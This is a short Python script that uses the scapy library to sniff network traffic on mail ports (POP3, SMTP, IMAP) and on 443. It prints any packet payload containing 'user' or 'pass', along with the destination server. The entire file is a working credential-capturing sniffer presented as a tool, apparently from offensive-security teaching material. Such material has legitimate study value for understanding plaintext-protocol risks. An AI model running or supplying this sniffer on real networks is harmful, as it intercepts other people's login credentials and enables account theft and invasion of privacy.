#!/usr/bin/env python

from scapy.all import *

# our packet callback
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload

# fire up sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143 or tcp port 443", prn=packet_callback, store=0)